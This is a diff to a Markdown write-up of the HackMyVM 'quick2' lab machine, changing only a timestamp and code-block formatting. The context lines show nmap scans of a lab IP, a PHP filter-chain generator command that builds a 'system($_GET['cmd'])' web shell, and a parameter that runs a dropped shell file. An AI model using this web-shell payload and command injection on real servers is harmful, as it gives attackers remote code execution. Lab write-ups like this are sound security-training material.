@@ -3,7 +3,7 @@ title: quick2
 tags:
   - sec/hackmyvm
 date: 2024-02-09T09:33:26
-lastmod: 2024-11-24T19:11:03
+lastmod: 2024-11-24T19:14:34
 toc: "true"
 draft: "false"
 ---
@@ -23,7 +23,7 @@ sudo nmap 192.168.10.4 -p22,80 -Pn -sT -sV -O -sC -oA  portscan/nmap
 ```
 ![HMM_quick2_image_5|750](https://img.l1uyun.one/HMM_quick2_image_5.png)
 ```bash
- sudo nmap 192.168.10.4 -sT -Pn -p20,80 --script=vuln -oA  portscan/vuln
+sudo nmap 192.168.10.4 -sT -Pn -p20,80 --script=vuln -oA  portscan/vuln
  ```
 ![HMM_quick2_image_6|700](https://img.l1uyun.one/HMM_quick2_image_6.png)
 ## web 服务
@@ -65,7 +65,7 @@ python php_filter_chain_generator.py --chain "<?php echo system($_GET['cmd']) ?>
 
 ![HMM_quick2_image_16](https://img.l1uyun.one/HMM_quick2_image_16.png)
 
-```
+```bash
 a=php%20/tmp/shell.txt
 ```
 ![HMM_quick2_image_17](https://img.l1uyun.one/HMM_quick2_image_17.png)
